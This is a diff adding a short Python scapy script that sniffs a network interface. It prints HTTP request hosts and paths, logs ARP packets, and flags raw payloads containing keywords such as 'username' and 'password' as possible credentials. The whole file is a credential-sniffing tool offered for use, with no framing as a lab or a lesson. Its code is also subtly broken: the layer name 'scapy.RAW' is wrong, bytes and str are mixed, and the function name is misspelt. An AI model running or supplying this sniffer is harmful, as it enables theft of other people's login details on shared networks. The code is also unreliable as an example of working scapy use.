@@ -1,0 +1,29 @@
+import scapy.all as scapy
+from scapy.layers import http
+import argparse
+
+def get_interface():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-i", "--interface", dest="interface", help="Specify the interface to sniff packets on")
+    arguments = parser.parse_args()
+    return arguments.interface
+
+def snnif(iface):
+    scapy.sniff(iface=iface, store=False, prn=process_packet)
+
+def process_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        print("[+] HTTP Request >> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
+        if packet.haslayer(scapy.RAW):
+            keys = ["username", "user", "email", "password", "pass"]
+            load = packet[scapy.RAW].load
+            for key in keys:
+                if key in load:
+                    print(f"[+] Possible password/username >> {load}")
+                    break
+        print(f"HTTP Request: {packet[http.HTTPRequest].Host} -> {packet[http.HTTPRequest].Path}")
+    elif packet.haslayer(scapy.ARP):
+        print(f"ARP Packet: {packet[scapy.ARP].psrc} -> {packet[scapy.ARP].pdst}")
+
+iface = get_interface()
+snnif(iface)
